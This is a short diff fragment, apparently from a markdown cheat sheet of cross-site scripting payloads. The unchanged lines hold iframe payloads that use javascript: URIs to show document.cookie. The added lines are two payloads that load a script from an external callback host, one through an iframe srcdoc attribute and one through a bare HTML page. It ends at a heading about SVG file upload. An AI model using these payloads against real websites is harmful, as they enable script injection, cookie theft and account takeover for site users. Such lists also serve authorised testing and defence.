@@ -91,6 +91,10 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 
 \"><iframe/src=javascript:alert&#x000000028;)>
 
+<iframe/srcdoc=”<script/src=//narayananm.xss.ht></script>”>
+
+<html><head><script src="//narayananm.xss.ht"></script></head><body></body></html>
+
 ```
 
 svg file upload
